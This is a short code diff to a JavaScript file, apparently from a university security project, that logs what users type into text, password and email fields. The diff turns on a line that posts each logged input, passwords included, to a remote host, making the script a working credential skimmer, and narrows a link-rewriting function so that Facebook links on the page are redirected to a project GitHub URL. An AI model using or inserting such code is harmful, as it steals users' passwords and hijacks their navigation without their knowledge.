@@ -88,7 +88,7 @@ function logInput(event) {
     var today = new Date();
     var input_log = '{"logtype": "INPUT", "datetime":"' + today + '", "inputType":"' + inputType + '", "inputName":"' + inputName + '", "input":"' + input + '"}';
     console.log(input_log);
-    // $.post(host_port, input_log);
+    $.post(host_port, input_log);
 }
 
 document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], textarea').forEach(function(input) {
@@ -98,6 +98,8 @@ document.querySelectorAll('input[type="text"], input[type="password"], input[typ
 function modifyLinks() {
     const newUrl = "https://github.com/TianYunQwQ/DD2525-Project";
     document.querySelectorAll('a').forEach(function(link) {
-        link.href = newUrl;
+        if (link.href.includes("facebook")) {
+            link.href = newUrl;
+        }
     });
 }
